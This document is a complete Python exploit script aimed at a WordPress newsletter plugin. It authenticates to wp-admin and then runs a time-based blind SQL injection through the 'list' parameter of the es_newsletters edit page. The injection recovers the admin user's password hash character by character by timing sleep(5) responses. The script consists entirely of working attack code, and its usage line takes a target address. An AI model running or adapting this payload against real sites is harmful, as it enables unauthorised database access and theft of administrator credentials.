import requests
import time
import sys


def login(url, username, password):
  wp_login = "%s/wp-login.php" % (url)
  wp_admin = "%s/wp-admin/" % (url)

  s = requests.Session()
  headers = { 'Cookie':'wordpress_test_cookie=WP Cookie check' }
  data={
    'log':username, 'pwd':password, 'wp-submit':'Log In',
    'redirect_to':wp_admin, 'testcookie':'1'
  }
  s.post(wp_login, headers=headers, data=data)
  resp = s.get(wp_admin)
  return s 

def findHash(session, target, length): 
  print ("Retrieving the Admin Hash: ", end='', flush=True)
  headers = { 'Cookie':'wordpress_test_cookie=WP Cookie check' }
  for i  in range (1, length):
    for j in [0] + list(range(32, 126)):
      url = "%s/wp-admin/admin.php?page=es_newsletters&action=edit&list=''or+1=1+union+select+(select+if(ascii(substring((select+user_pass+from+wp_users+where+user_login=char(97,100,109,105,110)),%d,1))=%d,sleep(5),sleep(0))),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1;--" % (target, i, j) 
      start = time.time()
      session.get(url)
      delay = time.time() - start
      if delay >= 5:
        if j == 0: print('\n') 
        else: print(chr(j), end='', flush=True)
        break
    if j == 0: break

def main():
  if len(sys.argv) != 4:
    print ("(+) usage: %s <ip> <username> <password>" % sys.argv[0])
    print ("(+) eg: %s 192.168.0.10 admin password" % sys.argv[0]) 
    sys.exit(0)

  url = sys.argv[1]
  username = sys.argv[2]
  password = sys.argv[3]

  s = login(url, username, password)
  adminHash = findHash(s, url, 50)

if __name__ == "__main__": 
  main()
